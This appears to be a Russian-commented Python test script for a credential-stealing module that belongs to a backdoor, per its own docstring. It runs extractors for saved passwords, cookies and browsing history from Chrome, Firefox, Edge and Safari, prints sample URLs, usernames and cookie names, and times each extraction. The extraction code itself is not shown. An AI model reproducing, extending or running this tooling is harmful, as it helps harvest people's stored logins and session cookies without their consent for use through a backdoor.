#!/usr/bin/env python3
"""
Тестовый скрипт для проверки Browser Data функциональности.
"""

import platform
import sys
from browser_data import BrowserDataExtractor, test_browser_extraction

def test_browser_extractors():
    """Тестирует различные экстракторы браузеров."""
    print("🧪 ТЕСТИРОВАНИЕ BROWSER DATA EXTRACTORS")
    print("=" * 50)
    
    extractor = BrowserDataExtractor()
    
    print("📊 Доступные браузеры:")
    available_browsers = extractor.get_available_browsers()
    for browser in available_browsers:
        print(f"  - {browser}")
    
    if not available_browsers:
        print("  ❌ Не найдено установленных браузеров")
        return
    
    print(f"\n🔍 Тестирование извлечения данных:")
    
    # Тестируем извлечение паролей
    print("\n🔐 Пароли:")
    passwords_result = extractor.extract_passwords()
    if passwords_result["success"]:
        print(f"  ✅ Найдено паролей: {len(passwords_result['passwords'])}")
        for pwd in passwords_result["passwords"][:3]:  # Показываем первые 3
            print(f"    - {pwd['url']}: {pwd['username']}")
    else:
        print(f"  ❌ Ошибка: {passwords_result['error']}")
    
    # Тестируем извлечение куки
    print("\n🍪 Куки:")
    cookies_result = extractor.extract_cookies()
    if cookies_result["success"]:
        print(f"  ✅ Найдено куки: {len(cookies_result['cookies'])}")
        for cookie in cookies_result["cookies"][:3]:  # Показываем первые 3
            print(f"    - {cookie['domain']}: {cookie['name']}")
    else:
        print(f"  ❌ Ошибка: {cookies_result['error']}")
    
    # Тестируем извлечение истории
    print("\n📚 История:")
    history_result = extractor.extract_history()
    if history_result["success"]:
        print(f"  ✅ Найдено записей истории: {len(history_result['history'])}")
        for entry in history_result["history"][:3]:  # Показываем первые 3
            print(f"    - {entry['url']}")
    else:
        print(f"  ❌ Ошибка: {history_result['error']}")
    
    print(f"\n✅ Тестирование завершено")

def test_integration():
    """Тестирует интеграцию с основным бэкдором."""
    print("\n🔗 ТЕСТИРОВАНИЕ ИНТЕГРАЦИИ")
    print("=" * 30)
    
    try:
        from browser_data import extract_all_browser_data, extract_browser_passwords, extract_browser_cookies, extract_browser_history
        
        print("📦 Тестирование extract_all_browser_data:")
        results = extract_all_browser_data()
        print(f"  Общий успех: {results.get('success', False)}")
        print(f"  Всего паролей: {results.get('total_passwords', 0)}")
        print(f"  Всего куки: {results.get('total_cookies', 0)}")
        print(f"  Всего истории: {results.get('total_history', 0)}")
        
        print("\n📦 Тестирование extract_browser_passwords:")
        pwd_result = extract_browser_passwords()
        print(f"  Успех: {pwd_result['success']}")
        print(f"  Количество паролей: {len(pwd_result.get('passwords', []))}")
        
        print("\n📦 Тестирование extract_browser_cookies:")
        cookie_result = extract_browser_cookies()
        print(f"  Успех: {cookie_result['success']}")
        print(f"  Количество куки: {len(cookie_result.get('cookies', []))}")
        
        print("\n📦 Тестирование extract_browser_history:")
        history_result = extract_browser_history()
        print(f"  Успех: {history_result['success']}")
        print(f"  Количество записей: {len(history_result.get('history', []))}")
        
        print("\n✅ Интеграция работает корректно")
        
    except ImportError as e:
        print(f"❌ Ошибка импорта: {e}")
    except Exception as e:
        print(f"❌ Ошибка интеграции: {e}")

def test_security():
    """Тестирует безопасность извлечения данных."""
    print("\n🔒 ТЕСТИРОВАНИЕ БЕЗОПАСНОСТИ")
    print("=" * 30)
    
    extractor = BrowserDataExtractor()
    
    # Тестируем различные браузеры
    browsers = ['chrome', 'firefox', 'edge', 'safari']
    
    print("🌐 Поддерживаемые браузеры:")
    for browser in browsers:
        extractor_instance = extractor.browsers[browser]
        installed = extractor_instance.is_installed()
        print(f"  - {browser}: {'✅ Установлен' if installed else '❌ Не установлен'}")
    
    print(f"\n🔍 Проверка платформы:")
    print(f"  Текущая ОС: {platform.system()}")
    
    if platform.system() == "Windows":
        print("  ✅ Windows - полная поддержка всех браузеров")
    elif platform.system() == "Darwin":
        print("  ✅ macOS - поддержка Chrome, Firefox, Safari")
    elif platform.system() == "Linux":
        print("  ✅ Linux - поддержка Chrome, Firefox")
    else:
        print("  ⚠️ Неизвестная ОС - ограниченная поддержка")
    
    print("\n✅ Тестирование безопасности завершено")

def test_performance():
    """Тестирует производительность извлечения данных."""
    print("\n⚡ ТЕСТИРОВАНИЕ ПРОИЗВОДИТЕЛЬНОСТИ")
    print("=" * 35)
    
    import time
    
    extractor = BrowserDataExtractor()
    
    # Тестируем время извлечения паролей
    print("🔐 Тестирование извлечения паролей:")
    start_time = time.time()
    passwords_result = extractor.extract_passwords()
    end_time = time.time()
    print(f"  Время выполнения: {end_time - start_time:.2f} секунд")
    print(f"  Найдено паролей: {len(passwords_result.get('passwords', []))}")
    
    # Тестируем время извлечения куки
    print("\n🍪 Тестирование извлечения куки:")
    start_time = time.time()
    cookies_result = extractor.extract_cookies()
    end_time = time.time()
    print(f"  Время выполнения: {end_time - start_time:.2f} секунд")
    print(f"  Найдено куки: {len(cookies_result.get('cookies', []))}")
    
    # Тестируем время извлечения истории
    print("\n📚 Тестирование извлечения истории:")
    start_time = time.time()
    history_result = extractor.extract_history()
    end_time = time.time()
    print(f"  Время выполнения: {end_time - start_time:.2f} секунд")
    print(f"  Найдено записей: {len(history_result.get('history', []))}")
    
    print("\n✅ Тестирование производительности завершено")

def main():
    """Основная функция тестирования."""
    print("🚀 ЗАПУСК ТЕСТОВ BROWSER DATA")
    print("=" * 50)
    
    try:
        # Тестируем базовые функции
        test_browser_extraction()
        
        # Тестируем экстракторы
        test_browser_extractors()
        
        # Тестируем интеграцию
        test_integration()
        
        # Тестируем безопасность
        test_security()
        
        # Тестируем производительность
        test_performance()
        
        print("\n🎉 ВСЕ ТЕСТЫ ЗАВЕРШЕНЫ УСПЕШНО!")
        
    except Exception as e:
        print(f"\n❌ Ошибка во время тестирования: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
